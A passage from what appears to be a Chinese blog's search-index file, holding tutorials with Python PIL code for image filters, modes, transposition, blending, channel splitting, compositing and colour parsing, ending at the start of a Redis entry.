class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageFilter</span><br><span class="line"></span><br><span class="line">font_posotion = <span class="number">20</span>,<span class="number">20</span></span><br><span class="line">color =  <span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span><br><span class="line">font = ImageFont.truetype(<span class="string">'Arial.ttf'</span>, size=<span class="number">25</span>, encoding=<span class="string">"unic"</span>)</span><br><span class="line">thumbnail_size = <span class="number">400</span>,<span class="number">400</span></span><br><span class="line">row_count = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_thumbnail</span>(<span class="params">src_file</span>):</span><br><span class="line">    size = thumbnail_size</span><br><span class="line">    im = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line"></span><br><span class="line">    im.thumbnail(size, Image.ANTIALIAS)</span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyFilter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    BLUR = <span class="string">"BLUR"</span></span><br><span class="line">    CONTOUR = <span class="string">"CONTOUR"</span></span><br><span class="line">    DETAIL = <span class="string">"DETAIL"</span></span><br><span class="line">    EDGE_ENHANCE = <span class="string">"EDGE_ENHANCE"</span></span><br><span class="line">    EDGE_ENHANCE_MORE = <span class="string">"EDGE_ENHANCE_MORE"</span></span><br><span class="line">    EMBOSS = <span class="string">"EMBOSS"</span></span><br><span class="line">    FIND_EDGES = <span class="string">"FIND_EDGES"</span></span><br><span class="line">    SMOOTH = <span class="string">"SMOOTH"</span></span><br><span class="line">    SMOOTH_MORE = <span class="string">"SMOOTH_MORE"</span></span><br><span class="line">    SHARPEN = <span class="string">"SHARPEN"</span></span><br><span class="line"></span><br><span class="line">    FilterList = [BLUR, CONTOUR, DETAIL,</span><br><span class="line">                  EDGE_ENHANCE, EDGE_ENHANCE_MORE, EMBOSS,</span><br><span class="line">                  FIND_EDGES, SMOOTH, SMOOTH_MORE,</span><br><span class="line">                  SHARPEN]</span><br><span class="line"></span><br><span class="line">    ImageFilterList = [ImageFilter.BLUR, ImageFilter.CONTOUR, ImageFilter.DETAIL,</span><br><span class="line">                       ImageFilter.EDGE_ENHANCE, ImageFilter.EDGE_ENHANCE_MORE, ImageFilter.EMBOSS,</span><br><span class="line">                       ImageFilter.FIND_EDGES, ImageFilter.SMOOTH, ImageFilter.SMOOTH_MORE,</span><br><span class="line">                       ImageFilter.SHARPEN]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMode</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    MODE1 = <span class="string">"1"</span></span><br><span class="line">    L = <span class="string">"L"</span></span><br><span class="line">    I = <span class="string">"I"</span></span><br><span class="line">    F = <span class="string">"F"</span></span><br><span class="line">    P = <span class="string">"P"</span></span><br><span class="line">    RGB = <span class="string">"RGB"</span></span><br><span class="line">    RGBX = <span class="string">"RGBX"</span></span><br><span class="line">    RGBA = <span class="string">"RGBA"</span></span><br><span class="line">    CMYK = <span class="string">"CMYK"</span></span><br><span class="line">    YCbCr = <span class="string">"YCbCr"</span></span><br><span class="line">    <span class="comment"># LAB = "LAB"</span></span><br><span class="line">    HSV = <span class="string">"HSV"</span></span><br><span class="line"></span><br><span class="line">    ModeList = [MODE1, L, I, F, P, RGB, RGBX, RGBA, CMYK, YCbCr, HSV]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_position</span>(<span class="params">count</span>):</span><br><span class="line"></span><br><span class="line">    width = thumbnail_size[<span class="number">0</span>]</span><br><span class="line">    pic_width = width*row_count</span><br><span class="line">    position = (count * width)%pic_width, (count * width)/pic_width*width</span><br><span class="line">    <span class="keyword">return</span> position</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pic_size</span>(<span class="params">thumbnail_size, pic_num, row_count</span>):</span><br><span class="line">    pic_width = thumbnail_size[<span class="number">0</span>] * row_count</span><br><span class="line">    extra_row = <span class="number">1</span> <span class="keyword">if</span> pic_num % row_count <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    pic_height = (pic_num / row_count + extra_row) * thumbnail_size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pic_width, pic_height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_filter</span>(<span class="params">src_file</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    pic_size = get_pic_size(thumbnail_size, <span class="built_in">len</span>(MyFilter.FilterList), row_count)</span><br><span class="line">    image = Image.new(<span class="string">"RGBA"</span>, pic_size, <span class="string">"white"</span>)</span><br><span class="line">    thumbnail_im = create_thumbnail(src_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MyFilter.FilterList)):</span><br><span class="line">        CONTOURimg = thumbnail_im.copy()</span><br><span class="line">        CONTOUR = CONTOURimg.<span class="built_in">filter</span>(MyFilter.ImageFilterList[count])</span><br><span class="line">        CONTOURdraw = ImageDraw.Draw(CONTOUR)</span><br><span class="line">        CONTOURdraw.text(font_posotion, MyFilter.FilterList[count], font=font, fill=color)</span><br><span class="line">        image.paste(CONTOUR, get_position(count))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># image.save("filter.jpg")</span></span><br><span class="line">    image.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_mode</span>(<span class="params">src_file</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    pic_size = get_pic_size(thumbnail_size, <span class="built_in">len</span>(MyMode.ModeList), row_count)</span><br><span class="line">    image = Image.new(<span class="string">"RGBA"</span>, pic_size, <span class="string">"white"</span>)</span><br><span class="line">    thumbnail_im = create_thumbnail(src_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MyMode.ModeList)):</span><br><span class="line">        img = thumbnail_im.copy()</span><br><span class="line">        CONTOURdraw = ImageDraw.Draw(img)</span><br><span class="line">        CONTOURdraw.text(font_posotion, MyMode.ModeList[count], font=font, fill=color)</span><br><span class="line"></span><br><span class="line">        CONTOUR = img.convert(MyMode.ModeList[i])</span><br><span class="line"></span><br><span class="line">        image.paste(CONTOUR, get_position(count))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># image.save("mode.jpg")</span></span><br><span class="line">    image.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    create_mode(<span class="string">"res.jpg"</span>)</span><br><span class="line">    create_filter(<span class="string">"res.jpg"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—Transpose,Blend,Split,Composite</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Transpose-Blend-Split-Composite/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Transpose-Blend-Split-Composite/</url>
      
        <content type="html"><![CDATA[<h4 id="Transpose-方向变换"><a href="#Transpose-方向变换" class="headerlink" title="Transpose 方向变换"></a>Transpose 方向变换</h4><ul><li>横看成岭侧成峰，好不容易有了Object，还不从各个方向都欣赏一下。<br><img src="https://img-blog.csdnimg.cn/20190727215620420.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h4 id="Blend-调节透明度并合并"><a href="#Blend-调节透明度并合并" class="headerlink" title="Blend 调节透明度并合并"></a>Blend 调节透明度并合并</h4><ul><li><pre><code>前提：两张图片的尺寸和模式一致。</code></pre></li><li>一张图想同时放两个Object，也不是不可以，但是图这两个Object怎么分配资源？当然是55开还是28开都可以，原则就是你只有两者的和为1。<blockquote><ul><li>合并公式：res_img = image1 * (1 - alpha) + image2 * alpha<br><img src="https://img-blog.csdnimg.cn/20190727220007302.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul></blockquote></li></ul><h4 id="Split-RGB通道"><a href="#Split-RGB通道" class="headerlink" title="Split RGB通道"></a>Split RGB通道</h4><p>每张图片都是有红绿蓝三个通道的，split方法可以将三个通道分离，像不像三种肤色的Object。<br><img src="https://img-blog.csdnimg.cn/20190727220155886.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Composite-两张图片合并，并加入mask图像作为透明度。"><a href="#Composite-两张图片合并，并加入mask图像作为透明度。" class="headerlink" title="Composite 两张图片合并，并加入mask图像作为透明度。"></a>Composite 两张图片合并，并加入mask图像作为透明度。</h4><ul><li>前提：image1, image2, mask 图片的尺寸和模式一致。<br>相当于Photoshop里的通道蒙版，下图效果不是特别好，可以注意一下图1的嘴，颜色没有图2、3明显。拿自己的Object试试看，可能对比效果会好一点。<br><img src="https://img-blog.csdnimg.cn/20190727220505748.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h4 id="原代码"><a href="#原代码" class="headerlink" title="原代码"></a>原代码</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageFont, ImageDraw</span><br><span class="line"></span><br><span class="line">font_posotion = <span class="number">20</span>,<span class="number">20</span></span><br><span class="line">color =  <span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span><br><span class="line">font = ImageFont.truetype(<span class="string">'Arial.ttf'</span>, size=<span class="number">25</span>, encoding=<span class="string">"unic"</span>)</span><br><span class="line">thumbnail_size = <span class="number">400</span>,<span class="number">400</span></span><br><span class="line">row_count = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_thumbnail</span>(<span class="params">src_file</span>):</span><br><span class="line">    size = thumbnail_size</span><br><span class="line">    im = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line"></span><br><span class="line">    im.thumbnail(size, Image.ANTIALIAS)</span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_position</span>(<span class="params">count</span>):</span><br><span class="line"></span><br><span class="line">    width = thumbnail_size[<span class="number">0</span>]</span><br><span class="line">    pic_width = width*row_count</span><br><span class="line">    position = (count * width)%pic_width, (count * width)/pic_width*width</span><br><span class="line">    <span class="keyword">return</span> position</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pic_size</span>(<span class="params">thumbnail_size, pic_num, row_count</span>):</span><br><span class="line">    pic_width = thumbnail_size[<span class="number">0</span>] * row_count</span><br><span class="line">    extra_row = <span class="number">1</span> <span class="keyword">if</span> pic_num % row_count <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    pic_height = (pic_num / row_count + extra_row) * thumbnail_size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pic_width, pic_height</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTranspose</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    FLIP_LEFT_RIGHT = <span class="string">"FLIP_LEFT_RIGHT"</span></span><br><span class="line">    FLIP_TOP_BOTTOM = <span class="string">"FLIP_TOP_BOTTOM"</span></span><br><span class="line">    ROTATE_90 = <span class="string">"ROTATE_90"</span></span><br><span class="line">    ROTATE_180 = <span class="string">"ROTATE_180"</span></span><br><span class="line">    ROTATE_270 = <span class="string">"ROTATE_270"</span></span><br><span class="line">    TRANSPOSE = <span class="string">"TRANSPOSE"</span></span><br><span class="line"></span><br><span class="line">    TransposeList = [FLIP_LEFT_RIGHT,FLIP_TOP_BOTTOM,ROTATE_90,ROTATE_180,ROTATE_270,TRANSPOSE]</span><br><span class="line">    ImageTransposeList = [Image.FLIP_LEFT_RIGHT,Image.FLIP_TOP_BOTTOM,Image.ROTATE_90,</span><br><span class="line">                          Image.ROTATE_180,Image.ROTATE_270,Image.TRANSPOSE]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySplit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    R = <span class="string">"R"</span></span><br><span class="line">    G = <span class="string">"G"</span></span><br><span class="line">    B = <span class="string">"B"</span></span><br><span class="line"></span><br><span class="line">    SplitList = [R, G, B]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_transpose</span>(<span class="params">src_file</span>):</span><br><span class="line">    <span class="comment"># 方向变换</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    pic_size = get_pic_size(thumbnail_size, <span class="built_in">len</span>(MyTranspose.TransposeList), row_count)</span><br><span class="line">    image = Image.new(<span class="string">"RGBA"</span>, pic_size, <span class="string">"white"</span>)</span><br><span class="line">    thumbnail_im = create_thumbnail(src_file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MyTranspose.TransposeList)):</span><br><span class="line">        img = thumbnail_im.copy()</span><br><span class="line">        CONTOURimg = img.transpose(MyTranspose.ImageTransposeList[i])</span><br><span class="line">        CONTOURdraw = ImageDraw.Draw(CONTOURimg)</span><br><span class="line">        CONTOURdraw.text(font_posotion, MyTranspose.TransposeList[count], font=font, fill=color)</span><br><span class="line">        image.paste(CONTOURimg, get_position(count))</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">    CONTOURimg = thumbnail_im.copy()</span><br><span class="line">    CONTOURdraw = ImageDraw.Draw(CONTOURimg)</span><br><span class="line">    CONTOURdraw.text(font_posotion, <span class="string">"ORIGINAL PIC"</span>, font=font, fill=color)</span><br><span class="line">    image.paste(CONTOURimg, get_position(count))</span><br><span class="line">    <span class="comment"># image.show()</span></span><br><span class="line">    image.save(<span class="string">"transpose.jpg"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_blend</span>(<span class="params">src_file</span>):</span><br><span class="line">    <span class="comment"># 合并</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line">    copy_img = img.transpose(Image.FLIP_LEFT_RIGHT)</span><br><span class="line">    res_img = Image.blend(img, copy_img, <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    res_img.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_composite</span>(<span class="params">src_file</span>):</span><br><span class="line">    <span class="comment"># 蒙版工具</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    mask_name = [<span class="string">"R"</span>,<span class="string">"G"</span>,<span class="string">"B"</span>]</span><br><span class="line">    image = Image.new(<span class="string">"RGBA"</span>, (<span class="number">1200</span>,<span class="number">400</span>), <span class="string">"white"</span>)</span><br><span class="line">    thumbnail_im = create_thumbnail(src_file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        copy_img = thumbnail_im.transpose(Image.FLIP_LEFT_RIGHT)</span><br><span class="line">        res_img = Image.blend(thumbnail_im, copy_img, <span class="number">0.5</span>)</span><br><span class="line">        my_split = res_img.split()</span><br><span class="line">        im = Image.composite(thumbnail_im, res_img, my_split[i])</span><br><span class="line">        CONTOURdraw = ImageDraw.Draw(im)</span><br><span class="line">        CONTOURdraw.text(font_posotion, <span class="string">"mask: %s"</span> % mask_name[i], font=font, fill=color)</span><br><span class="line">        image.paste(im, get_position(count))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    image.save(<span class="string">"composite.jpg"</span>)</span><br><span class="line">    <span class="comment"># image.show()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_split</span>(<span class="params">src_file</span>):</span><br><span class="line">    <span class="comment"># 图层</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    pic_size = get_pic_size(thumbnail_size, <span class="built_in">len</span>(MySplit.SplitList), row_count)</span><br><span class="line">    image = Image.new(<span class="string">"RGBA"</span>, pic_size, <span class="string">"white"</span>)</span><br><span class="line">    thumbnail_im = create_thumbnail(src_file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MySplit.SplitList)):</span><br><span class="line">        CONTOURimg = thumbnail_im.split()[i].copy()</span><br><span class="line">        CONTOURdraw = ImageDraw.Draw(CONTOURimg)</span><br><span class="line">        CONTOURdraw.text(font_posotion, MySplit.SplitList[count], font=font)</span><br><span class="line">        image.paste(CONTOURimg, get_position(count))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># image.show()</span></span><br><span class="line">    image.save(<span class="string">"split.jpg"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># create_transpose("res.jpg")</span></span><br><span class="line">    <span class="comment"># create_split("res.jpg")</span></span><br><span class="line">    <span class="comment"># create_blend("res.jpg")</span></span><br><span class="line">    create_composite(<span class="string">"res.jpg"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—Color</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Color/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Color/</url>
      
        <content type="html"><![CDATA[<h4 id="ImageColor"><a href="#ImageColor" class="headerlink" title="ImageColor"></a>ImageColor</h4><h5 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h5><ul><li>共六位前两位表示R，中间两位表示G，后两位表示B 如：#ff0000</li></ul><h5 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h5><ul><li>如：rgb(255, 0, 0)、rgb(100%, 0%, 0%)</li></ul><h5 id="HSL-Hue-Saturation-Ligntness"><a href="#HSL-Hue-Saturation-Ligntness" class="headerlink" title="HSL(Hue-Saturation-Ligntness)"></a>HSL(Hue-Saturation-Ligntness)</h5><ul><li>hsl(hue, saturation%, lightness%)</li><li>hue 为[0, 360], red=0, green=120, blue=240</li><li>saturation 为[0%, 100%] gray=0, full=100%</li><li>lightness 为[0%, 100%] black=0, normal=50%, white=100%</li><li>如：hsl(0, 100%, 50%)</li></ul><h5 id="Getrgb"><a href="#Getrgb" class="headerlink" title="Getrgb"></a>Getrgb</h5><ul><li>六种方法获取红色tuple值<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ImageColors.getrgb(<span class="string">"ff0000"</span>)</span><br><span class="line"><span class="comment"># (255,0,0)</span></span><br><span class="line">ImageColors.getrgb(<span class="string">"rgb(255,0,0)"</span>)</span><br><span class="line"><span class="comment"># (255,0,0)</span></span><br><span class="line">ImageColors.getrgb(<span class="string">"rgb(100%,0%,0%)"</span>)</span><br><span class="line"><span class="comment"># (255,0,0)</span></span><br><span class="line">ImageColors.getrgb(<span class="string">"hsl(0,100%,50%)"</span>)</span><br><span class="line"><span class="comment"># (255,0,0)</span></span><br><span class="line">ImageColors.getrgb(<span class="string">"red"</span>) <span class="comment"># 不是每个颜色类型的单词都可以这样用，pil中罗列了常用的颜色</span></span><br><span class="line"><span class="comment"># (255,0,0)</span></span><br><span class="line">ImageColors.getrgb(<span class="string">"Red"</span>)</span><br><span class="line"><span class="comment"># (255,0,0)</span></span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—ImageFilter函数</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94ImageFilter%E5%87%BD%E6%95%B0/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94ImageFilter%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/icamera0/article/details/50708888">参考地址</a></p><h4 id="滤镜函数"><a href="#滤镜函数" class="headerlink" title="滤镜函数"></a>滤镜函数</h4><h5 id="先看效果"><a href="#先看效果" class="headerlink" title="先看效果"></a>先看效果</h5><p><img src="https://img-blog.csdnimg.cn/20190729010351783.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h5><blockquote><p>Kernel(size, kernel, scale=None, offset=0)</p></blockquote><ul><li>生成给定尺寸的卷积核，变量的size必须为(3, 3) 或(5, 5)。</li><li>kernel与size对应，必须为9或25个整数或浮点数。</li><li>如果设置scale，则卷积核作用于每个像素之后都要除以scale值，默认值为卷积核的权重之和。</li><li>如果设置offset，则将offset值与卷积核相加，然后除以scale</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line">Kernel_im = im.<span class="built_in">filter</span>(ImageFilter.Kernel((<span class="number">3</span>,<span class="number">3</span>),(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>)))</span><br></pre></td></tr></tbody></table></figure><h5 id="RankFilter"><a href="#RankFilter" class="headerlink" title="RankFilter"></a>RankFilter</h5><blockquote><p>RankFilter(size, rank)</p></blockquote><ul><li>等级滤波器。</li><li>对于输入图像的每个像素点，等级滤波器根据像素值，在(size, size) 的区域中对所有像素点进行排序，然后拷贝对应等级的值存储到输出图像中。</li><li>size，以像素点为中心size * size 的像素点中进行排序。</li><li>rank，size * size 的像素中选择排序第rank位的像素作为新值。</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line">im = im.<span class="built_in">filter</span>(ImageFilter.RankFilter(<span class="number">5</span>,<span class="number">24</span>))</span><br></pre></td></tr></tbody></table></figure><h5 id="MinFilter-MedianFilter-MaxFilter"><a href="#MinFilter-MedianFilter-MaxFilter" class="headerlink" title="MinFilter, MedianFilter,MaxFilter"></a>MinFilter, MedianFilter,MaxFilter</h5><blockquote><p>MinFilter(size)<br>最小滤波器。<br>MedianFilter(size)<br>中值滤波器。<br>MaxFilter(size)<br>最大滤波器。</p></blockquote><ul><li>size，以像素点为中心的(size * size) 区域中选择最小、中值、最大的像素作为新值。</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line">im = im.<span class="built_in">filter</span>(ImageFilter.MinFilter(<span class="number">5</span>))</span><br><span class="line">im = im.<span class="built_in">filter</span>(ImageFilter.MedianFilterFilter(<span class="number">5</span>))</span><br><span class="line">im = im.<span class="built_in">filter</span>(ImageFilter.MaxFilter(<span class="number">5</span>))</span><br></pre></td></tr></tbody></table></figure><h5 id="ModeFilter"><a href="#ModeFilter" class="headerlink" title="ModeFilter"></a>ModeFilter</h5><blockquote><p>ModeFilter(size)</p></blockquote><ul><li>模式滤波器</li><li>size，以像素点为中心的(size * size)区域中选择出现次数最多的像素最为新值。</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(src_file)</span><br><span class="line">im = im.<span class="built_in">filter</span>(ImageFilter.ModeFilter(<span class="number">5</span>))</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-expire比exists更好用</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-expire%E6%AF%94exists%E6%9B%B4%E5%A5%BD%E7%94%A8/"/>
